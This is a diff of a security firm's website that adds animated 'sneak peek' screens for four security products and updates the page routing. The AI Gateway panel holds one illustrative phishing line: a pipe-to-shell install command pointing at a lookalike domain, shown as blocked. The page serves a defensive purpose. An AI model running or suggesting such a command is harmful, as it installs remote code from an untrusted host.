@@ -203,9 +203,27 @@ pre{font:13px/1.6 var(--mono);background:rgba(9,14,28,.8);border:1px solid var(-
 #reveal .fly{position:absolute;width:12px;height:12px;margin:-6px 0 0 -6px;border-radius:50%;background:var(--amber);box-shadow:0 0 16px var(--amber);opacity:0;
   transition:left .55s var(--ease),top .55s var(--ease),width .55s var(--ease),height .55s var(--ease),margin .55s var(--ease),border-radius .55s var(--ease),background .4s,opacity .3s}
 #app.dimmed #menu .wrap{transition:opacity .4s,filter .4s;opacity:.12;filter:blur(2px)}
-#glint.pre .ptile{opacity:0;transform:scale(.9)}
-#glint .ptile{transition:border-color .25s,transform .35s var(--ease),opacity .35s}
-/* ---------- secret: Glint ---------- */
+#classified.pre .ptile{opacity:0;transform:scale(.9)}
+#classified .ptile{transition:border-color .25s,transform .35s var(--ease),opacity .35s}
+/* ---------- secret: Classified ---------- */
+
+.mk-pass,.mk-box,.mk-knob{transform-box:fill-box;transform-origin:center}
+.mk-pass{animation:mkPass 5s ease-in-out infinite}
+@keyframes mkPass{0%,80%,100%{transform:translateX(0);opacity:1}85%{transform:translateX(-5px);opacity:0}86%{transform:translateX(-5px);opacity:0}92%{transform:translateX(0);opacity:1}95%{transform:translateX(2px)}}
+.mk-draw{stroke-dasharray:12;animation:mkDraw 5s ease-in-out infinite}
+@keyframes mkDraw{0%,78%,100%{stroke-dashoffset:0}82%{stroke-dashoffset:12}90%{stroke-dashoffset:0}}
+.mk-box{animation:mkBox 5s ease-in-out infinite}
+@keyframes mkBox{0%,88%,100%{transform:scale(1)}93%{transform:scale(1.3)}}
+.mk-knob{animation:mkKnob 5s cubic-bezier(.2,.8,.2,1) infinite}
+@keyframes mkKnob{0%,78%,100%{transform:translateX(0)}83%,88%{transform:translateX(-9px)}}
+@media (prefers-reduced-motion:reduce){.mk-pass,.mk-draw,.mk-box,.mk-knob{animation:none}}
+
+.secret .orbi{margin-left:auto;width:28px;height:28px;color:var(--ice);flex:none}
+.secret .orbi svg{width:100%;height:100%;display:block;overflow:visible}
+.secret:hover .orbi,.secret:focus-visible .orbi{color:#fff}
+/* touch screens can't hover: let the word show through the redaction a little */
+@media (hover:none),(pointer:coarse){#menu .secret span.redact{background:rgba(37,49,79,.55);color:rgba(233,237,247,.55)}#menu .secret{color:#b8c1d6}}
+
 .star{display:inline-block;width:1em;height:1em;background:currentColor;flex:none;
   clip-path:polygon(50% 0,57% 43%,100% 50%,57% 57%,50% 100%,43% 57%,0 50%,43% 43%)}
 .secret{display:flex;align-items:center;gap:14px;text-align:left;background:none;border:0;border-top:1px dashed var(--line);cursor:pointer;
@@ -223,11 +241,33 @@ pre{font:13px/1.6 var(--mono);background:rgba(9,14,28,.8);border:1px solid var(-
 #flash.go .star{animation:burst 1.3s var(--ease) forwards}
 @keyframes flash{0%{opacity:0}30%,48%{opacity:1;background-color:#fff}100%{opacity:0;background-color:transparent}}
 @keyframes burst{0%{transform:scale(0) rotate(0)}40%{transform:scale(30) rotate(90deg)}100%{transform:scale(34) rotate(100deg)}}
-#glint .wrap{justify-content:center}
+#classified .wrap,.peek .wrap{justify-content:center}
 .cl{max-width:none}
+.plede{margin:0;max-width:56ch;color:#c9d0e2}
+.pctas{display:flex;gap:12px;flex-wrap:wrap}
+.ptile .pm svg{width:26px;height:26px;display:block}
+.glogo .pm2 svg{width:.8em;height:.8em;display:block}
+.glogo .pg2{font:600 .3em/1 var(--mono);letter-spacing:.06em;color:var(--ice);border:2px solid var(--ice);padding:.4em .35em}
+.ppanel{background:var(--panel);border:1px solid var(--line);padding:18px 20px;box-shadow:0 30px 80px rgba(0,0,0,.5);font-size:14px;color:#c9d0e2}
+.pph{display:flex;justify-content:space-between;align-items:center;gap:10px;font:500 12px/1.3 var(--mono);letter-spacing:.14em;text-transform:uppercase;color:var(--dim);border-bottom:1px solid var(--line);padding-bottom:10px;margin-bottom:12px}
+.pchip{font:600 12px/1 var(--mono);letter-spacing:.1em;text-transform:uppercase;padding:5px 7px;border:1px solid currentColor;flex:none}
+.pchip.bad{color:#ff6b6b}.pchip.warn{color:var(--amber)}.pchip.info{color:var(--ice)}
+.pmsg{background:rgba(9,14,28,.7);border:1px solid var(--line);padding:10px 12px;margin-bottom:10px;overflow-wrap:anywhere}
+.pmsg span{display:block;font:500 12px/1.3 var(--mono);letter-spacing:.14em;text-transform:uppercase;color:var(--dim);margin-bottom:5px}
+.pmsg code{font:500 13px/1.5 var(--mono);color:var(--ice)}
+.pfind{list-style:none;margin:0;padding:0;display:grid;gap:8px}
+.pfind li{display:flex;justify-content:space-between;align-items:center;gap:10px;border-top:1px dashed var(--line);padding-top:8px}
+.pbig{font:700 42px/1 var(--display);color:var(--ink)}.pbig small{font:500 14px/1 var(--body);color:var(--dim);margin-left:8px}
+.psub{margin:6px 0 12px}
+.ptrace{list-style:none;margin:0;padding:0;display:grid;gap:8px}
+.ptrace li{padding-left:18px;position:relative;overflow-wrap:anywhere}.ptrace li::before{content:"";position:absolute;left:0;top:.5em;width:8px;height:8px;background:var(--ice)}
+.ptrace b,.pkv dd{color:var(--ink);font-weight:600}
+.pkv{display:grid;grid-template-columns:auto minmax(0,1fr);gap:8px 14px;margin:0}
+.pkv dt{font:500 12px/1.6 var(--mono);letter-spacing:.08em;text-transform:uppercase;color:var(--dim)}.pkv dd{margin:0}
+
 .cl-intro{margin:0 0 22px;max-width:62ch;color:#c9d0e2}
 .ptiles{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:14px}
-.ptile{display:flex;flex-direction:column;gap:10px;border:1px solid var(--line);background:var(--panel);padding:20px 20px 18px;text-decoration:none;color:var(--ink);transition:border-color .25s,transform .25s var(--ease)}
+.ptile{font:inherit;text-align:left;cursor:pointer;display:flex;flex-direction:column;gap:10px;border:1px solid var(--line);background:var(--panel);padding:20px 20px 18px;text-decoration:none;color:var(--ink);transition:border-color .25s,transform .25s var(--ease)}
 .ptile:hover,.ptile:focus-visible{border-color:var(--ice);transform:translateY(-2px)}
 .ptile.glint{border-color:rgba(255,255,255,.35)}
 .ptile .pn{display:flex;align-items:center;gap:12px;font:700 clamp(22px,2.4vw,28px)/1.1 var(--display)}
@@ -446,7 +486,7 @@ a.btn{text-decoration:none;display:inline-block}
     </div>
   </section>
 
-  <section class="screen" id="glint" inert>
+  <section class="screen" id="classified" inert>
     <div class="wrap">
       <div class="top">
         <span class="eyebrow">Classified · products in development</span>
@@ -456,28 +496,144 @@ a.btn{text-decoration:none;display:inline-block}
         <h2 class="ghead">What we're building</h2>
         <p class="cl-intro">Alongside consulting, SecureAxis builds its own security products. None of them is on sale yet; each site explains what works today and how to get involved.</p>
         <div class="ptiles">
-          <a class="ptile glint" id="glintCta" href="https://glint.secureaxis.net/" target="_blank" rel="noopener">
+          <button type="button" class="ptile glint" data-go="glint" id="classifiedFirst">
             <span class="pn"><span class="star" aria-hidden="true"></span>Glint</span>
             <span class="pd">Blanks a confidential document when a phone camera is aimed at the screen, and records the attempt.</span>
-            <span class="ps">Waitlist open<span class="go">glint.secureaxis.net ▸</span></span>
-          </a>
-          <a class="ptile" href="https://gateway.secureaxis.net/" target="_blank" rel="noopener">
-            <span class="pn"><span class="pg" aria-hidden="true">AG</span>AI Gateway</span>
+            <span class="ps">Waitlist open<span class="go">Sneak peek ▸</span></span>
+          </button>
+          <button type="button" class="ptile" data-go="gateway">
+            <span class="pn"><span class="pm" style="color:#ff4f8b"><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><rect x="2.5" y="3" width="4" height="18" rx="1" fill="currentColor"/><rect x="17.5" y="3" width="4" height="18" rx="1" fill="currentColor"/><path class="mk-pass" d="M8.5 12h7M12.5 8.5 16 12l-3.5 3.5" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></span>AI Gateway</span>
             <span class="pd">Checks every prompt and every AI answer for phishing links, hidden instructions and leaked secrets, and detonates suspicious links in a sandbox.</span>
-            <span class="ps">Early access<span class="go">gateway.secureaxis.net ▸</span></span>
-          </a>
-          <a class="ptile" href="https://risk.secureaxis.net/" target="_blank" rel="noopener">
-            <span class="pn"><span class="pg" aria-hidden="true">RK</span>SecureAxis Risk</span>
+            <span class="ps">Early access<span class="go">Sneak peek ▸</span></span>
+          </button>
+          <button type="button" class="ptile" data-go="risk">
+            <span class="pn"><span class="pm" style="color:#34c08c"><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><circle cx="5.5" cy="18.5" r="3.5" fill="currentColor"/><path class="mk-draw" d="M8 16 16 8" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"/><rect class="mk-box" x="14" y="2.5" width="7.5" height="7.5" rx="1" fill="none" stroke="currentColor" stroke-width="2.4"/></svg></span>SecureAxis Risk</span>
             <span class="pd">Monthly security reporting built from the tools you already own, where every number traces back to its source file.</span>
-            <span class="ps">Pilots open<span class="go">risk.secureaxis.net ▸</span></span>
-          </a>
-          <a class="ptile" href="https://response.secureaxis.net/" target="_blank" rel="noopener">
-            <span class="pn"><span class="pg" aria-hidden="true">RS</span>SecureAxis Response</span>
+            <span class="ps">Pilots open<span class="go">Sneak peek ▸</span></span>
+          </button>
+          <button type="button" class="ptile" data-go="response">
+            <span class="pn"><span class="pm" style="color:#f5d90a"><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><rect x="1.5" y="6" width="21" height="12" rx="6" fill="currentColor"/><circle class="mk-knob" cx="16.5" cy="12" r="3.6" fill="#141518"/></svg></span>SecureAxis Response</span>
             <span class="pd">Approved response actions through the EDR you already run, with a named approver, dry-run by default and a full record.</span>
-            <span class="ps">Pilots open<span class="go">response.secureaxis.net ▸</span></span>
-          </a>
+            <span class="ps">Pilots open<span class="go">Sneak peek ▸</span></span>
+          </button>
         </div>
-        <p class="gcap">Each opens in a new tab.</p>
+        <p class="gcap">Each opens a short sneak peek, with a link to the product's own site.</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="screen peek" id="glint" inert>
+    <div class="wrap">
+      <div class="top">
+        <span class="eyebrow">Sneak peek · a SecureAxis product</span>
+        <button class="back" data-go="classified">← All products</button>
+      </div>
+      <div class="ggrid">
+        <div>
+          <div class="glogo"><span class="star" aria-hidden="true"></span>Glint</div>
+          <h2 class="ghead">Stop the photo your DLP can't see.</h2>
+          <p class="plede">Glint notices when a phone camera is aimed at a confidential document and blanks that document. The rest of the screen stays as it was, and the attempt is recorded.</p>
+          <ol class="gsteps"><li>The camera turns on only while a Confidential document is open.</li><li>A phone aimed at the screen blanks just that window.</li><li>The attempt is logged for your security team. No video is stored.</li></ol>
+          <div class="pctas">
+            <a class="btn" id="glintCta" href="https://glint.secureaxis.net/" target="_blank" rel="noopener">More about Glint ▸</a>
+          </div>
+          <p class="gcap">Opens glint.secureaxis.net, with the full details and the waitlist. In development, for Windows 11 fleets first.</p>
+        </div>
+        <figure style="margin:0">
+          <div class="gwin" role="img" aria-label="A confidential document window that turns black when a camera is pointed at it">
+            <div class="gbar"><span class="gtag">Confidential</span>FY27 pricing model.xlsx</div>
+            <div class="gbody"><i style="width:60%"></i><i></i><i style="width:88%"></i><i style="width:72%"></i><i></i><i style="width:45%"></i><i style="width:80%"></i></div>
+            <div class="gblank">Hidden while a camera is pointed at this screen.</div>
+          </div>
+          <figcaption class="gcap">Only the classified window goes black. A photo shows the attempt, not the content.</figcaption>
+        </figure>
+      </div>
+    </div>
+  </section>
+
+  <section class="screen peek" id="gateway" inert>
+    <div class="wrap">
+      <div class="top">
+        <span class="eyebrow">Sneak peek · a SecureAxis product</span>
+        <button class="back" data-go="classified">← All products</button>
+      </div>
+      <div class="ggrid">
+        <div>
+          <div class="glogo"><span class="pm2" style="color:#ff4f8b"><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><rect x="2.5" y="3" width="4" height="18" rx="1" fill="currentColor"/><rect x="17.5" y="3" width="4" height="18" rx="1" fill="currentColor"/><path class="mk-pass" d="M8.5 12h7M12.5 8.5 16 12l-3.5 3.5" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></span>AI Gateway</div>
+          <h2 class="ghead">AI answers are the new phishing email.</h2>
+          <p class="plede">AI Gateway sits between your people, your apps and AI model APIs, and checks every prompt and every answer for phishing links, hidden instructions, leaked secrets and malicious install commands.</p>
+          <ol class="gsteps"><li>Hidden characters are decoded first, so nothing invisible slips through.</li><li>Suspicious links and files are opened in a sandbox, and the verdict comes from what happened.</li><li>Apps switch over by changing one address. Model API keys stay in the gateway.</li></ol>
+          <div class="pctas">
+            <a class="btn" id="gatewayCta" href="https://gateway.secureaxis.net/" target="_blank" rel="noopener">More about AI Gateway ▸</a>
+          </div>
+          <p class="gcap">Opens gateway.secureaxis.net, with the full details and early access. Working prototype.</p>
+        </div>
+        <figure style="margin:0">
+          <div class="ppanel" role="img" aria-label="Illustration: an AI reply recommending a lookalike installer is blocked, with the reasons listed">
+            <div class="pph"><span>Reply checked</span><span class="pchip bad">Blocked</span></div>
+            <div class="pmsg"><span>Model reply</span>Run <code>curl -s https://contoso-vpn.help/i.sh | sh</code> to install the VPN client.</div>
+            <ul class="pfind"><li>Brand on the wrong domain<span class="pchip bad">Phishing</span></li><li>Pipe-to-shell install<span class="pchip bad">Blocked</span></li><li>Sandbox: password form posts off-site<span class="pchip bad">Malicious</span></li></ul>
+          </div>
+          <figcaption class="gcap">Illustration with made-up names.</figcaption>
+        </figure>
+      </div>
+    </div>
+  </section>
+
+  <section class="screen peek" id="risk" inert>
+    <div class="wrap">
+      <div class="top">
+        <span class="eyebrow">Sneak peek · a SecureAxis product</span>
+        <button class="back" data-go="classified">← All products</button>
+      </div>
+      <div class="ggrid">
+        <div>
+          <div class="glogo"><span class="pm2" style="color:#34c08c"><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><circle cx="5.5" cy="18.5" r="3.5" fill="currentColor"/><path class="mk-draw" d="M8 16 16 8" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"/><rect class="mk-box" x="14" y="2.5" width="7.5" height="7.5" rx="1" fill="none" stroke="currentColor" stroke-width="2.4"/></svg></span>SecureAxis Risk</div>
+          <h2 class="ghead">Cyber risk you can prove.</h2>
+          <p class="plede">SecureAxis Risk turns the security tools you already own into monthly reporting your board and auditors can trace. Every number links back to the source file it came from.</p>
+          <ol class="gsteps"><li>Reads from the scanners, EDR and identity tools you already run.</li><li>Maps once to NIST CSF 2.0, CIS v8, PCI DSS 4.0.1 and GDPR.</li><li>A value it can't read stays empty. Never guessed, never carried over.</li></ol>
+          <div class="pctas">
+            <a class="btn" id="riskCta" href="https://risk.secureaxis.net/" target="_blank" rel="noopener">More about SecureAxis Risk ▸</a>
+          </div>
+          <p class="gcap">Opens risk.secureaxis.net, with the full details and pilot requests. In development, self-hosted.</p>
+        </div>
+        <figure style="margin:0">
+          <div class="ppanel" role="img" aria-label="Illustration with sample data: 37 of 412 devices have critical vulnerabilities past their fix deadline, traced to the source file and its hash">
+            <div class="pph"><span>Monthly report · sample</span><span class="pchip info">Traceable</span></div>
+            <div class="pbig">37<small>of 412 devices</small></div>
+            <p class="psub">Critical vulnerabilities past their fix deadline</p>
+            <ul class="ptrace"><li><b>Source</b> scanner_export_2026-10.csv</li><li><b>SHA-256</b> 9f2c…e41a</li><li><b>Maps to</b> NIST CSF 2.0 ID.RA</li></ul>
+          </div>
+          <figcaption class="gcap">Illustration with sample data.</figcaption>
+        </figure>
+      </div>
+    </div>
+  </section>
+
+  <section class="screen peek" id="response" inert>
+    <div class="wrap">
+      <div class="top">
+        <span class="eyebrow">Sneak peek · a SecureAxis product</span>
+        <button class="back" data-go="classified">← All products</button>
+      </div>
+      <div class="ggrid">
+        <div>
+          <div class="glogo"><span class="pm2" style="color:#f5d90a"><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><rect x="1.5" y="6" width="21" height="12" rx="6" fill="currentColor"/><circle class="mk-knob" cx="16.5" cy="12" r="3.6" fill="#141518"/></svg></span>SecureAxis Response</div>
+          <h2 class="ghead">SecureAxis decides. Your EDR enforces.</h2>
+          <p class="plede">Response actions through the EDR you already run, each with a reason, a named approver and a record your auditors can read.</p>
+          <ol class="gsteps"><li>Isolate a device, release it, or block a file hash. No second agent.</li><li>Four-eyes: the approver can't be the person who recommended it.</li><li>Dry run by default, so it records what it would have done first.</li></ol>
+          <div class="pctas">
+            <a class="btn" id="responseCta" href="https://response.secureaxis.net/" target="_blank" rel="noopener">More about SecureAxis Response ▸</a>
+          </div>
+          <p class="gcap">Opens response.secureaxis.net, with the full details and pilot requests. In development, SentinelOne first.</p>
+        </div>
+        <figure style="margin:0">
+          <div class="ppanel" role="img" aria-label="Illustration with sample data: an isolate-device action waiting for a second approver, in dry-run mode">
+            <div class="pph"><span>Action · sample</span><span class="pchip warn">Dry run</span></div>
+            <dl class="pkv"><dt>Action</dt><dd>Isolate LAPTOP-0142</dd><dt>Reason</dt><dd>Credential-theft alert, confirmed</dd><dt>Recommended</dt><dd>Analyst A</dd><dt>Approver</dt><dd>Someone else (four-eyes)</dd><dt>Would send</dt><dd>Isolate request to your EDR</dd></dl>
+          </div>
+          <figcaption class="gcap">Illustration with sample data.</figcaption>
+        </figure>
       </div>
     </div>
   </section>
@@ -513,18 +669,20 @@ const reduce=matchMedia("(prefers-reduced-motion:reduce)").matches;
 $("#mark").innerHTML=[..."SECURE"].map((c,i)=>`<span style="--i:${i}">${c}</span>`).join("")+
   [..."AXIS"].map((c,i)=>`<span class="ax" style="--i:${i+6}">${c}</span>`).join("");
 
+const PEEKS=["glint","gateway","risk","response"], SECRET=["classified",...PEEKS];
 function go(id){
   if(id===current)return;
   const from=$("#"+current), to=$("#"+id);
   from.classList.remove("on"); from.classList.add("gone"); from.inert=true;
   to.classList.remove("gone"); to.classList.add("on"); to.inert=false;
   current=id; arrived=performance.now(); boost(1);
-  setHash(id==="menu"?SERVICES[active].id:id==="glint"?"glint":id==="title"?"":null);
+  setHash(id==="menu"?SERVICES[active].id:SECRET.includes(id)?id:id==="title"?"":null);
   setTimeout(()=>{from.classList.remove("gone");
     if(id==="menu"){placeCursor();items[active].focus({preventScroll:true})}
     if(id==="brief")$("#f-name").focus({preventScroll:true});
     if(id==="title")$("#startBtn").focus({preventScroll:true});
-    if(id==="glint")$("#glintCta").focus({preventScroll:true});
+    if(id==="classified")$("#classifiedFirst").focus({preventScroll:true});
+    if(PEEKS.includes(id))$("#"+id+"Cta").focus({preventScroll:true});
   },380);
 }
 let hashTimer;
@@ -534,7 +692,7 @@ function route(){
   const h=decodeURIComponent(location.hash.slice(1)), i=SERVICES.findIndex(s=>s.id===h), was=current;
   if(i>=0){setActive(i,true);go("menu")}
   else if(h==="services")go("menu");
-  else if(h==="glint")go("glint");
+  else if(SECRET.includes(h))go(h);
   else if(h==="about"||h==="all-services"){go("title");setTimeout(()=>$("#"+h).scrollIntoView({behavior:reduce?"auto":"smooth"}),was==="title"?0:520)}
 }
 addEventListener("hashchange",route);
@@ -562,8 +720,9 @@ const items=SERVICES.map((s,i)=>{
 // secret entry: the classified item, or type G-L-I-N-T anywhere
 const flash=$("#flash"), secret=document.createElement("button");
 secret.className="secret"; secret.type="button"; secret.setAttribute("aria-label","Classified: products in development");
-secret.innerHTML=`<span class="code">??</span><span class="redact">Classified</span><span class="star" aria-hidden="true"></span>`;
+secret.innerHTML=`<span class="code">??</span><span class="redact">Classified</span><span class="orbi" aria-hidden="true"><svg viewBox="0 0 24 24"><g transform="rotate(-24 12 12)"><ellipse cx="12" cy="12" rx="10" ry="4.2" fill="none" stroke="currentColor" stroke-width="1.6"/><circle cx="12" cy="12" r="2.2" fill="#ffb84a"/><circle r="1.9" fill="#fff"><animateMotion dur="3.2s" repeatCount="indefinite" path="M22,12 A10,4.2 0 1,1 2,12 A10,4.2 0 1,1 22,12"/></circle></g></svg></span>`;
 list.appendChild(secret);
+if(reduce){const o=secret.querySelector(".orbi svg");o&&o.pauseAnimations&&o.pauseAnimations()}
 let revealing=false, typed="";
 function reveal(x,y){
   if(revealing||current==="glint")return;
@@ -577,8 +736,8 @@ function reveal(x,y){
 // Classified click: "access granted", then the axis spins up and four dots become the product tiles
 const rv=$("#reveal");
 function accessReveal(){
-  if(revealing||current==="glint")return;
-  if(reduce){go("glint");return}
+  if(revealing||SECRET.includes(current))return;
+  if(reduce){go("classified");return}
   revealing=true;
   const grant=rv.querySelector(".grant"), orb=rv.querySelector(".orb"), flies=[...rv.querySelectorAll(".fly")], T=[];
   const at=(ms,fn)=>T.push(setTimeout(fn,ms));
@@ -588,15 +747,15 @@ function accessReveal(){
   const word="ACCESS GRANTED", pool="ABCDEFGHJKLMNPQRSTUVWXYZ0123456789#%&"; let f=0;
   const tick=()=>{f++;grant.textContent=[...word].map((c,i)=>c===" "?" ":(f>7+i*1.4?c:pool[Math.random()*pool.length|0])).join("");if(f<34)at(26,tick)};
   at(220,()=>{grant.classList.add("show");tick()});
-  at(1350,()=>{grant.classList.add("out");orb.classList.add("show");boost(3);$("#glint").classList.add("pre");go("glint");app.classList.remove("dimmed")});
+  at(1350,()=>{grant.classList.add("out");orb.classList.add("show");boost(3);$("#classified").classList.add("pre");go("classified");app.classList.remove("dimmed")});
   at(2250,()=>{
-    const a=app.getBoundingClientRect(), tiles=[...document.querySelectorAll("#glint .ptile")], o=orb.getBoundingClientRect();
+    const a=app.getBoundingClientRect(), tiles=[...document.querySelectorAll("#classified .ptile")], o=orb.getBoundingClientRect();
     flies.forEach(fl=>{fl.style.transition="none";fl.style.left=(o.left+o.width/2-a.left)+"px";fl.style.top=(o.top+o.height/2-a.top)+"px";fl.style.opacity=1});
     orb.classList.add("out");
     requestAnimationFrame(()=>requestAnimationFrame(()=>flies.forEach((fl,i)=>{const t=tiles[i].getBoundingClientRect();fl.style.transition="";
       Object.assign(fl.style,{left:(t.left-a.left)+"px",top:(t.top-a.top)+"px",width:t.width+"px",height:t.height+"px",margin:"0",borderRadius:"0",background:"rgba(255,184,74,.16)",border:"1px solid #ffb84a"})})));
   });
-  at(2850,()=>{$("#glint").classList.remove("pre");flies.forEach(fl=>fl.style.opacity=0)});
+  at(2850,()=>{$("#classified").classList.remove("pre");flies.forEach(fl=>fl.style.opacity=0)});
   at(3200,()=>{rv.classList.remove("on");revealing=false});
 }
 secret.onclick=()=>accessReveal();
@@ -651,7 +810,8 @@ addEventListener("keydown",e=>{
     else if(e.key==="Escape")go("title");
   }
   else if(current==="brief"&&e.key==="Escape"&&!typing)go("menu");
-  else if(current==="glint"&&e.key==="Escape")go("menu");
+  else if(current==="classified"&&e.key==="Escape")go("menu");
+  else if(PEEKS.includes(current)&&e.key==="Escape")go("classified");
   if(!typing&&e.key.length===1){typed=(typed+e.key.toLowerCase()).slice(-5);if(typed==="glint"){typed="";reveal()}}
 });
 addEventListener("resize",placeCursor);
